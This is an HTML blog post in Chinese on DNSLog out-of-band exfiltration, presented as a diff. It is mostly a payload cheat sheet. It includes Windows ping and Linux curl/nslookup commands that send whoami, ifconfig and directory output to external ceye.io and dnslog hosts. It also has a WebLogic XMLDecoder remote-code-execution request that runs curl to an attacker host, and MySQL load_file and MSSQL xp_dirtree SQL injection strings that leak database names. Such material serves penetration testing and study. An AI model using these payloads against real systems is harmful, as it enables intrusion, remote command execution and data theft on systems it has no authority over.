@@ -1,0 +1,1488 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="搭建Dnslogdnslog原理： DNS在解析的时候会留下日志，这类工具就是读取多级域名的解析日志，来获取信息，简单来说就是把信息放在多级子域名中，传递到我们自己的服务器中，然后读取日志，获取特定信息，最后根据获取的信息来判断我们渗透测试的动作是否成功运行。  搭建：https://github.com/BugScanTeam/DNSLog  ceye: http://ceye.io/recor">
+<meta name="keywords" content="dns">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dnslog">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="搭建Dnslogdnslog原理： DNS在解析的时候会留下日志，这类工具就是读取多级域名的解析日志，来获取信息，简单来说就是把信息放在多级子域名中，传递到我们自己的服务器中，然后读取日志，获取特定信息，最后根据获取的信息来判断我们渗透测试的动作是否成功运行。  搭建：https://github.com/BugScanTeam/DNSLog  ceye: http://ceye.io/recor">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3mvepls7j20jd0b2jux.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3mybteepj211h0bqgmg.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3n3bz7h8j20w60mcwfl.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nborwd6j2084036aa6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3ncbzpjcj20ta09610g.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629609_5b971b69e8889.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629626_5b971b7a299bb.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629639_5b971b8756c19.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629691_5b971bbb3ef0e.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629709_5b971bcd4c91a.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629736_5b971be894844.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629766_5b971c06c0cb5.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629792_5b971c20aa1f9.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629818_5b971c3ab5d9c.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629847_5b971c57ea468.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629878_5b971c76723bd.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629909_5b971c951a8f7.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629934_5b971cae895a1.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536629964_5b971cccb6bd5.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630003_5b971cf3de464.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630039_5b971d17c1be1.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630079_5b971d3fd57e0.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630118_5b971d660da4f.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630151_5b971d8769f64.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630182_5b971da6a1e4c.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630213_5b971dc56df6b.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630249_5b971de9e1b13.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630280_5b971e0801570.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630369_5b971e6170ead.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630396_5b971e7c06c88.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180911/1536630425_5b971e9941425.png!small">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3negbsl3j20z807qduq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nlkogpjj20h805a7sc.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nfc5v70j20j806pjry.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3niax5h0j20rv0idwsa.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nl7zmboj20ie03ox16.jpg">
+<meta property="og:updated_time" content="2019-12-03T06:03:16.864Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dnslog">
+<meta name="twitter:description" content="搭建Dnslogdnslog原理： DNS在解析的时候会留下日志，这类工具就是读取多级域名的解析日志，来获取信息，简单来说就是把信息放在多级子域名中，传递到我们自己的服务器中，然后读取日志，获取特定信息，最后根据获取的信息来判断我们渗透测试的动作是否成功运行。  搭建：https://github.com/BugScanTeam/DNSLog  ceye: http://ceye.io/recor">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3mvepls7j20jd0b2jux.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>dnslog | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">dnslog
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-13 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-13T00:00:00+08:00">2019-01-13</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-03 14:03:16" itemprop="dateModified" datetime="2019-12-03T14:03:16+08:00">2019-12-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">17k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">15 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="搭建Dnslog"><a href="#搭建Dnslog" class="headerlink" title="搭建Dnslog"></a>搭建Dnslog</h1><p>dnslog原理：</p>
+<p>DNS在解析的时候会留下日志，这类工具就是读取多级域名的解析日志，来获取信息，简单来说就是把信息放在多级子域名中，传递到我们自己的服务器中，然后读取日志，获取特定信息，最后根据获取的信息来判断我们渗透测试的动作是否成功运行。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3mvepls7j20jd0b2jux.jpg" alt></p>
+<p>搭建：<a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p>
+<p> ceye: <a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3mybteepj211h0bqgmg.jpg" alt></p>
+<h1 id="windows常用payload："><a href="#windows常用payload：" class="headerlink" title="windows常用payload："></a>windows常用payload：</h1><table>
+<thead>
+<tr>
+<th>ping   %COMPUTERNAME%.2gln5s.ceye.io</th>
+<th>查看返回的计算机名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>for   /F &quot;delims=&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.2gln5s.ceye.io</td>
+<td>查看返回的计算机名</td>
+</tr>
+<tr>
+<td>for /F &quot;delims=\   tokens=2&quot; %i in (&#39;whoami&#39;) do ping -n 1 %itest.2gln5s.ceye.io</td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>%APPDATA%   :</th>
+<th>列出应用程序数据的默认存放位置。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%CD%   :</td>
+<td>列出当前目录。</td>
+</tr>
+<tr>
+<td>%CLIENTNAME%   :</td>
+<td>列出联接到终端服务会话时客户端的NETBIOS名。</td>
+</tr>
+<tr>
+<td>%CMDCMDLINE%   :</td>
+<td>列出启动当前cmd.exe所使用的命令行。</td>
+</tr>
+<tr>
+<td>%CMDEXTVERSION%   :</td>
+<td>命令出当前命令处理程序扩展版本号。</td>
+</tr>
+<tr>
+<td>%CommonProgramFiles%   :</td>
+<td>列出了常用文件的文件夹路径。</td>
+</tr>
+<tr>
+<td>%COMPUTERNAME%   :</td>
+<td>列出了计算机名。</td>
+</tr>
+<tr>
+<td>%COMSPEC%   :</td>
+<td>列出了可执行命令外壳（命令处理程序）的路径。</td>
+</tr>
+<tr>
+<td>%DATE%   :</td>
+<td>列出当前日期。</td>
+</tr>
+<tr>
+<td>%ERRORLEVEL%   :</td>
+<td>列出了最近使用的命令的错误代码。</td>
+</tr>
+<tr>
+<td>%HOMEDRIVE%   :</td>
+<td>列出与用户主目录所在的驱动器盘符。</td>
+</tr>
+<tr>
+<td>%HOMEPATH%   :</td>
+<td>列出用户主目录的完整路径。</td>
+</tr>
+<tr>
+<td>%HOMESHARE%   :</td>
+<td>列出用户共享主目录的网络路径。</td>
+</tr>
+<tr>
+<td>%LOGONSEVER%   :</td>
+<td>列出有效的当前登录会话的域名控制器名。</td>
+</tr>
+<tr>
+<td>%NUMBER_OF_PROCESSORS%   :</td>
+<td>列出了计算机安装的处理器数。</td>
+</tr>
+<tr>
+<td>%OS%   :</td>
+<td>列出操作系统的名字。(Windows   XP 和 Windows 2000 列为 Windows_NT.)</td>
+</tr>
+<tr>
+<td>%Path%   :</td>
+<td>列出了可执行文件的搜索路径。</td>
+</tr>
+<tr>
+<td>%PATHEXT%   :</td>
+<td>列出操作系统认为可被执行的文件扩展名。</td>
+</tr>
+<tr>
+<td>%PROCESSOR_ARCHITECTURE%   :</td>
+<td>列出了处理器的芯片架构。</td>
+</tr>
+<tr>
+<td>%PROCESSOR_IDENTFIER%   :</td>
+<td>列出了处理器的描述。</td>
+</tr>
+<tr>
+<td>%PROCESSOR_LEVEL%   :</td>
+<td>列出了计算机的处理器的型号。</td>
+</tr>
+<tr>
+<td>%PROCESSOR_REVISION%   :</td>
+<td>列出了处理器的修订号。</td>
+</tr>
+<tr>
+<td>%ProgramFiles%   :</td>
+<td>列出了Program   Files文件夹的路径。</td>
+</tr>
+<tr>
+<td>%PROMPT%   :</td>
+<td>列出了当前命令解释器的命令提示设置。</td>
+</tr>
+<tr>
+<td>%RANDOM%   :</td>
+<td>列出界于0   和 32767之间的随机十进制数。</td>
+</tr>
+<tr>
+<td>%SESSIONNAME%   :</td>
+<td>列出连接到终端服务会话时的连接和会话名。</td>
+</tr>
+<tr>
+<td>%SYSTEMDRIVE%   :</td>
+<td>列出了Windows启动目录所在驱动器。</td>
+</tr>
+<tr>
+<td>%SYSTEMROOT%   :</td>
+<td>列出了Windows启动目录的位置。</td>
+</tr>
+<tr>
+<td>%TEMP%   and %TMP% :</td>
+<td>列出了当前登录的用户可用应用程序的默认临时目录。</td>
+</tr>
+<tr>
+<td>%TIME%   :</td>
+<td>列出当前时间。</td>
+</tr>
+<tr>
+<td>%USERDOMAIN%   :</td>
+<td>列出了包含用户帐号的域的名字。</td>
+</tr>
+<tr>
+<td>%USERNAME%   :</td>
+<td>列出当前登录的用户的名字。</td>
+</tr>
+<tr>
+<td>%USERPROFILE%   :</td>
+<td>列出当前用户Profile文件位置。</td>
+</tr>
+<tr>
+<td>%WINDIR%   :</td>
+<td>列出操作系统目录的位置。</td>
+</tr>
+<tr>
+<td>%ALLUSERSPROFILE%</td>
+<td>本地   返回“所有用户”配置文件的位置。</td>
+</tr>
+<tr>
+<td>%APPDATA%</td>
+<td>本地   返回默认情况下应用程序存储数据的位置。</td>
+</tr>
+<tr>
+<td>%CD%</td>
+<td>本地   返回当前目录字符串。</td>
+</tr>
+<tr>
+<td>%CMDCMDLINE%</td>
+<td>本地   返回用来启动当前的 Cmd.exe 的准确命令行。</td>
+</tr>
+<tr>
+<td>%CMDEXTVERSION%</td>
+<td>系统   返回当前的“命令处理程序扩展”的版本号。</td>
+</tr>
+<tr>
+<td>%COMPUTERNAME%</td>
+<td>系统 返回计算机的名称。</td>
+</tr>
+<tr>
+<td>%COMSPEC%</td>
+<td>系统   返回命令行解释器可执行程序的准确路径。</td>
+</tr>
+<tr>
+<td>%DATE%</td>
+<td>系统   返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</td>
+</tr>
+<tr>
+<td>%ERRORLEVEL%</td>
+<td>系统   返回上一条命令的错误代码。通常用非零值表示错误。</td>
+</tr>
+<tr>
+<td>%HOMEDRIVE%</td>
+<td>系统   返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td>
+</tr>
+<tr>
+<td>%HOMEPATH%</td>
+<td>系统   返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td>
+</tr>
+<tr>
+<td>%HOMESHARE%</td>
+<td>系统   返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td>
+</tr>
+<tr>
+<td>%LOGONSERVER%</td>
+<td>本地   返回验证当前登录会话的域控制器的名称。</td>
+</tr>
+<tr>
+<td>%NUMBER_OF_PROCESSORS%</td>
+<td>系统 指定安装在计算机上的处理器的数目。</td>
+</tr>
+<tr>
+<td>%OS%</td>
+<td>系统   返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td>
+</tr>
+</tbody></table>
+<h1 id="Linux常用payload："><a href="#Linux常用payload：" class="headerlink" title="Linux常用payload："></a>Linux常用payload：</h1><table>
+<thead>
+<tr>
+<th>nslookup  whoami.test.2gln5s.ceye.io</th>
+<th>查看主机的名称</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>curl   -X POST <a href="http://ip.port.2gln5s.ceye.io/whoami?p=" target="_blank" rel="noopener">http://ip.port.2gln5s.ceye.io/whoami?p=</a>   http -d data=http</td>
+<td>查看主机名称名返回，以http形式</td>
+</tr>
+<tr>
+<td>curl test.2gln5s.ceye.io/`ifconfig</td>
+<td>base64</td>
+</tr>
+<tr>
+<td>curl <a href="http://ip.port.2gln5s.ceye.io/`ls`" target="_blank" rel="noopener">http://ip.port.2gln5s.ceye.io/`ls`</a></td>
+<td>显示当前目录下的文件 （只能显示一个）</td>
+</tr>
+<tr>
+<td>curl   <code>whoami</code>.2gln5s.ceye.io</td>
+<td>查看主机的名称</td>
+</tr>
+<tr>
+<td><a href="http://rinige.com/index.php/archives/705/" target="_blank" rel="noopener">http://rinige.com/index.php/archives/705/</a></td>
+<td>dnslog   攻击的一些姿势</td>
+</tr>
+<tr>
+<td>启动三个白帽任意   linux 结界</td>
+<td>curl -b cookie=admin   ccxxxx.dnslog.info</td>
+</tr>
+<tr>
+<td>创建   cookie 文件</td>
+<td>echo -e &quot;ccxxxx.dnslog.info\tFALSE\t/\tFALSE\t1450450776\tusername\tadmin&quot; &gt; cookies.txt</td>
+</tr>
+<tr>
+<td>执行系统命令，并将结果追加到  cookies.txt 中去</td>
+<td>pwd | tee -a   cookies.txt</td>
+</tr>
+<tr>
+<td>将回显内容变成一行</td>
+<td>paste -s -d &quot;:&quot;   cookies.txt | tee cookies.txt</td>
+</tr>
+<tr>
+<td>日志记录回显内容   cookie</td>
+<td>curl -b cookies.txt cc6020.dnslog.info</td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3n3bz7h8j20w60mcwfl.jpg" alt></p>
+<p>Poc:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0</span><br><span class="line">Content-Type:text/xml</span><br><span class="line">Content-Length: 657</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">string</span>&gt;</span>curl XXXX.dnslog.link/`ifconfig|base64|tr '\n' '-'`<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="数据库payload"><a href="#数据库payload" class="headerlink" title="数据库payload"></a>数据库payload</h1><table>
+<thead>
+<tr>
+<th>load_file(concat(&#39;\\\\&#39;,(select   database()),&#39;.2gln5s.ceye.io\abc&#39;))</th>
+<th>读取数据库</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;   and if((select load_file(concat(&#39;\\&#39;,(select   database()),&#39;.xxxx.ceye.io\abc&#39;))),1,1)--+</td>
+<td></td>
+</tr>
+<tr>
+<td>?id=1&#39;   and if((select load_file(concat(&#39;\\&#39;,(select table_name from   information_schema.tables where table_schema=&#39;security&#39; limit   0,1),&#39;.test.2gln5s.ceye.io\abc&#39;))),1,1)--+</td>
+<td></td>
+</tr>
+<tr>
+<td>DECLARE @host varchar(1024);</td>
+<td>注册一个名为@host的变量，类型为varchar</td>
+</tr>
+<tr>
+<td>SELECT @host=CONVERT(varchar(1024),db_name())+&#39;.xxxxxxxxx.dnslog.link&#39;;</td>
+<td>db_name()然后转换成varchar类型</td>
+</tr>
+<tr>
+<td>EXEC(&#39;master..xp_dirtree &quot;<a href="file://'+@host+'/foobar$" target="_blank" rel="noopener">\&#39;+@host+&#39;\foobar$</a>&quot;&#39;);</td>
+<td>远程主机的foobar$目录</td>
+</tr>
+</tbody></table>
+<p>注入时候需要注意设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my.ini</span><br><span class="line"></span><br><span class="line">secure-auth=0secure_file_priv   = &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nborwd6j2084036aa6.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3ncbzpjcj20ta09610g.jpg" alt></p>
